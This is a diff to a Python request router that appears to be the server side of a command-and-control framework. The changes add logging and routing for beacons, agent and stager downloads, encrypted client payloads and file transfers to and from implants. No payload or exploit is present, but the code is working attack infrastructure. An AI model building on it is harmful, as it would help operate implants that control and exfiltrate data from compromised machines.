@@ -2,6 +2,7 @@ import logging
 import json
 import base64
 import urllib.parse
+import re
 
 logger = logging.getLogger(__name__)
 
@@ -79,13 +80,29 @@ class OperationRouter:
             base_path = path.split('?')[0] if '?' in path else path
             endpoint_type = self.path_router.get_endpoint_type(base_path)
             
+            # Enhanced logging for request handling
+            logger.info(f"Received {method} request on path: {path}")
+            logger.info(f"Endpoint type identified as: {endpoint_type}")
+            
             # Handle direct agent/stager downloads based on path
             if endpoint_type in ["agent_path", "previous_agent_path", "old_agent_path"]:
+                logger.info(f"Routing to agent_handler for agent code")
                 self.agent_handler.handle_agent_request()
                 return
             elif endpoint_type in ["stager_path", "previous_stager_path", "old_stager_path"]:
+                logger.info(f"Routing to agent_handler for stager code")
                 self.agent_handler.handle_stager_request()
                 return
+            
+            # Special check for paths that look like file operations
+            # This catches dynamic file paths that might not be explicitly mapped
+            if "/file/" in path or "/download/" in path or "/content/" in path:
+                logger.info(f"Path {path} appears to be a file operation path based on pattern")
+                # Check request contents to determine if it's a download or upload
+                if self._is_file_download_request(method):
+                    logger.info(f"Request appears to be a file download (server TO client)")
+                    self.file_download_handler.handle()
+                    return
             
             # For other endpoints, try to extract payload data
             if method == "GET":
@@ -108,7 +125,13 @@ class OperationRouter:
                     # If no data parameter but endpoint is a known type, route based on endpoint
                     if endpoint_type in ["beacon_path", "previous_beacon_path", "old_beacon_path", "pool_path", "previous_pool_path", "old_pool_path"]:
                         # This might be a ping or simple beacon
+                        logger.info(f"Routing to beacon_handler (no data, endpoint type: {endpoint_type})")
                         self.beacon_handler.handle()
+                        return
+                    elif endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
+                        # This might be a file download request
+                        logger.info(f"Routing to file_download_handler (no data, endpoint type: {endpoint_type})")
+                        self.file_download_handler.handle()
                         return
                     else:
                         self.send_error_response(400, "Missing data parameter")
@@ -134,12 +157,19 @@ class OperationRouter:
                         self.send_error_response(400, "Missing data field")
                         return
                 except json.JSONDecodeError:
-                    self.send_error_response(400, "Invalid JSON format")
-                    return
+                    # For non-JSON POST requests, check if the path suggests a file operation
+                    if endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
+                        logger.info(f"Non-JSON POST request to file_request_path, routing to file_download_handler")
+                        self.file_download_handler.handle()
+                        return
+                    else:
+                        self.send_error_response(400, "Invalid JSON format")
+                        return
             
             # For first contact, don't attempt to decrypt
             if is_first_contact:
                 # Handle as beacon for first contact (initial key exchange)
+                logger.info(f"Handling as first contact beacon")
                 self.beacon_handler.handle(include_rotation_info=True)
                 return
             
@@ -153,12 +183,14 @@ class OperationRouter:
             if client_id:
                 # Store identified client ID on the request handler
                 self.request_handler.client_id = client_id
+                logger.info(f"Successfully identified client: {client_id}")
             
             if not client_id or not decrypted_data:
                 # Try with provided client ID if available
                 if client_id:
                     try:
                         decrypted_data = self.crypto_helper.decrypt(encrypted_data, client_id)
+                        logger.info(f"Decrypted data using provided client ID: {client_id}")
                     except Exception as e:
                         logger.error(f"Failed to decrypt with provided client ID: {e}")
                         self.send_error_response(401, "Authentication failed")
@@ -174,12 +206,35 @@ class OperationRouter:
                     try:
                         payload = json.loads(decrypted_data)
                     except json.JSONDecodeError:
-                        # If it can't be parsed as JSON, assume it's a beacon with simple data
-                        self.request_handler.decrypted_payload = decrypted_data
-                        self.beacon_handler.handle()
-                        return
+                        # If it can't be parsed as JSON, check path-based routing first
+                        if endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
+                            logger.info(f"Routing to file_download_handler based on endpoint type: {endpoint_type}")
+                            self.request_handler.decrypted_payload = decrypted_data
+                            self.file_download_handler.handle()
+                            return
+                        # Otherwise assume it's a beacon with simple data
+                        else:
+                            logger.info(f"Treating non-JSON decrypted data as beacon data")
+                            self.request_handler.decrypted_payload = decrypted_data
+                            self.beacon_handler.handle()
+                            return
                 else:
                     payload = decrypted_data
+                
+                # Enhanced logic to check for file operations based on payload content
+                if isinstance(payload, dict):
+                    # Check for file download indicators
+                    if "FilePath" in payload or "Destination" in payload:
+                        logger.info(f"Identified file download request by payload fields")
+                        self.request_handler.decrypted_payload = payload
+                        self.file_download_handler.handle()
+                        return
+                    # Check for file upload indicators
+                    elif "FileName" in payload and "FileContent" in payload:
+                        logger.info(f"Identified file upload request by payload fields")
+                        self.request_handler.decrypted_payload = payload
+                        self.file_handler.handle()
+                        return
                 
                 # Extract operation type
                 operation_type = payload.get("op_type", "beacon")  # Default to beacon
@@ -192,23 +247,28 @@ class OperationRouter:
                 
                 # Route to appropriate handler based on operation type
                 if operation_type == "beacon":
+                    logger.info(f"Routing to beacon_handler based on op_type")
                     self.beacon_handler.handle()
                 elif operation_type == "result":
+                    logger.info(f"Routing to result_handler based on op_type")
                     self.result_handler.handle()
                 elif operation_type == "file_up":
                     # Handle file upload FROM client TO server (saving to downloads folder)
-                    logger.info(f"Handling file upload FROM client TO server (saving to downloads folder)")
+                    logger.info(f"Routing to file_handler based on op_type (file_up)")
                     self.file_handler.handle()
                 elif operation_type == "file_down":
                     # Handle file download FOR client FROM server (reading from uploads folder)
-                    logger.info(f"Handling file download FOR client FROM server (reading from uploads folder)")
+                    logger.info(f"Routing to file_download_handler based on op_type (file_down)")
                     self.file_download_handler.handle()
                 elif operation_type == "agent":
+                    logger.info(f"Routing to agent_handler based on op_type")
                     self.agent_handler.handle_agent_request()
                 elif operation_type == "stager":
+                    logger.info(f"Routing to agent_handler (stager) based on op_type")
                     self.agent_handler.handle_stager_request()
                 else:
                     # Default to endpoint type based on the URL path
+                    logger.info(f"No matching op_type, using endpoint type: {endpoint_type}")
                     if endpoint_type in ["beacon_path", "previous_beacon_path", "old_beacon_path", "pool_path"]:
                         self.beacon_handler.handle()
                     elif endpoint_type in ["cmd_result_path", "previous_cmd_result_path", "old_cmd_result_path"]:
@@ -227,6 +287,7 @@ class OperationRouter:
                         self.send_success_response()
             except json.JSONDecodeError as e:
                 # Handle direct request to endpoint without JSON payload
+                logger.info(f"JSON decode error, routing based on endpoint: {endpoint_type}")
                 if endpoint_type in ["beacon_path", "previous_beacon_path", "old_beacon_path", "pool_path"]:
                     self.beacon_handler.handle()
                 elif endpoint_type in ["cmd_result_path", "previous_cmd_result_path", "old_cmd_result_path"]:
@@ -244,6 +305,46 @@ class OperationRouter:
         except Exception as e:
             logger.error(f"Error in operation router: {e}")
             self.send_error_response(500, "Server error")
+    
+    def _is_file_download_request(self, method):
+        """
+        Analyze the request to determine if it's likely a file download request
+        
+        Args:
+            method: HTTP method (GET or POST)
+            
+        Returns:
+            bool: True if it appears to be a file download request
+        """
+        # Check Content-Type header
+        content_type = self.request_handler.headers.get('Content-Type', '')
+        
+        # If this is a POST with content-type indicating a file operation
+        if method == "POST" and (
+            "json" in content_type or 
+            "application/octet-stream" in content_type
+        ):
+            try:
+                # Check if the body has file request indicators
+                content_length = int(self.request_handler.headers.get('Content-Length', 0))
+                if content_length > 0:
+                    body = self.request_handler.rfile.read(content_length).decode('utf-8')
+                    # Reset the read position - important for subsequent handlers
+                    self.request_handler.rfile = type(self.request_handler.rfile)(
+                        body.encode('utf-8')
+                    )
+                    
+                    # Look for file request keywords
+                    if ("file" in body.lower() and "path" in body.lower()) or "filerequest" in body.lower():
+                        return True
+            except:
+                # If we can't read or parse the body, use path-based heuristics
+                path = self.request_handler.path.lower()
+                return "/file/" in path or "/download/" in path
+        
+        # Otherwise, check the path
+        path = self.request_handler.path.lower()
+        return "/file/" in path or "/download/" in path or "/content/" in path
     
     def send_error_response(self, status_code=500, message="Server Error"):
         """Send an error response"""
